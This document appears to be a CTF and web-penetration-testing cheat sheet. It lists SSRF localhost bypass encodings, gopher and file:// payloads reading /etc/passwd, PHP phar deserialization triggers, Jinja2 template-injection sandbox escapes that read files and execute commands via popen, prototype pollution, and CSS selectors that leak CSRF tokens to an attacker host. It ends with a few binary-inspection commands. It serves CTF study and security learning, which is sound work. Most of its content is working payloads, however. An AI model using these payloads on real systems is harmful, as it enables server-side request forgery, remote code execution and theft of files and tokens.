# Tool


## Web


### Reference
* [WEB CTF CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet/blob/master/README.md#%E7%A9%BA%E7%99%BD%E7%B9%9E%E9%81%8E)
* [Basic Concept of Penetration Testing](https://hackmd.io/@boik/ryf5wZM5Q#/)
* [Awesome Web Security](https://github.com/qazbnm456/awesome-web-security)
* [SSRF Bible](https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit)


### Sensitive files
* [git-dumper](https://github.com/arthaud/git-dumper)  
  > A tool to dump a git repository from a website.


### IP/Domain Bypass
* Representation
  * 127.0.0.1
  * localhost
  * 127.0.1
  * 127.1
  * 0.0.0.0
  * 0

* Encode
  * 2130706443 (dec)
  * 0x7f00000001 (hex)
  * 0x7f.0x0.0x0.0x1
  * 0177000000001 (oct)
  * 0177.0.0.01

* IPv6
  * ::1
  * ::127.0.0.1
  * ::ffff:127.0.0.1
  * [::]
  * ip6-localhost

* Unicode (browser)
  * http://ⓀⒶⒾⒷⓇⓄ.ⓉⓌ

* Third party
  * 127.0.0.1.xip.io
    > A record: 127.0.0.1
  * foo.bar.10.0.0.1.xip.io
  * A.54.87.54.87.1time.127.0.0.1.forever.rebind.network
    > DNS rebinding service
  * 36573657.7f000001.rbndr.us
    > DNS rebinding service

* 302 Bypass
  > If the environment does not block http redirect, query your own web server which respond
  >
  > ```php
  > <?php
  >   Header("Locathon: gohper://127.0.0.1:9000/_...")
  > ?>
  > ```


### Scheme
* Gopher
  > Simulate most tcp connections with no interactive.

  * gopher://127.0.0.1:5487/\_AB%0d%0aCD
    > `<scheme>://<authority>/<padding><payload>`
  * [Gopher Payload Generator](https://github.com/tarunkant/Gopherus)

* Local File Scheme
  * `file:///etc/passwd`
  * `file://localhost/etc/passwd`
  * `local_file:///etc/passwd` (Python 2.7)
  * `file:///var/www/html/` (JAVA)
  * `netdoc:///var/www/html/` (JAVA)

* PHP Stream Wrapper
  * `php://filter`
  * `php://input`
  * `php://fd`


### Deserialization
* PHP Phar deserialization
  * `phar://`
  * trigger (file operation functions)
    * file_get_contents()
    * include()
    * file_exists()
    * getimagesize()
    * unlink()
    * file()
    * fopen()
    * is_dir()
* Python pickle
  > Stack-based virtual pickle machine
* Java deserialization
  * [ysoserial](https://github.com/frohoff/ysoserial)
* ASP.NET deserialization
  * [ysoserial.net](https://github.com/pwntester/ysoserial.net)
  * `ViewState`, `Session`, ... are highly possible to have serialize
      data.


### SSTI
* Jinja2
  * {{ config }}
  * sendbox bypass

    ```python
    # All the below payloads works under python2
    --------------------------------------------

    # Starting from string or list
    {{ "".__class__.__base__ }}

    # File operation
    {{ ''.__class__.__mro__[2].__subclasses__() }}
    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt').write('test') }}
    
    # RCE
    {{ ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read() }}
    > uid=1000(ubuntu)gid=1000(ubuntu)...

    # All the below payloads works under python3
    --------------------------------------------

    # Find eval
    {% for c in [].__class__.__base__.__subclasses__(): %}
      {% if c.__name__ == 'catch_warnings': %}
        {% for b in c.__init__.__globals__.values(): %}
          {% if b.__class__ == {}.__class__ %}
            {% if 'eval' in b.keys(): %}
              {{ b['eval']('__import__("os").popen("id").read()') }}
            {% endif %}
          {% endif %}
        {% endif %}
      {% endif %}
    {% endfor %}
    ```


### Prototype Pollution
> Javascript

* Prototype chain
  > When finding a property, Javascript will go through the Prototype
    Chain until \_\_proto\_\_ is null.

* Prototype pollution

  ```javascript
  > a = []
  > b = []
  > a["__proto__"]["test"] = "testtest" // a["__proto__"] is array
  > b.test
  < "testtest"
  ```


### CSS Injection
* expression()
* import URL
  > Referer
  > ...
* CSS Selector
  > Read part of HTML source, like CSRF Token

  ```css
  input[name=csrf][value^="1"]{background:url(http://ip/1)}   X
  input[name=csrf][value^="2"]{background:url(http://ip/2)}   O
  input[name=csrf][value^="2a"]{background:url(http://ip/2a)} X
  input[name=csrf][value^="2e"]{background:url(http://ip/2e)} O
  ...
  ```


## Pwn


### Section
* `$ readelf -S <binary>`
  > section header
* `$ objdump -R <binary>`
  > got table
* `$ objdump -d <binary>`
  > plt table
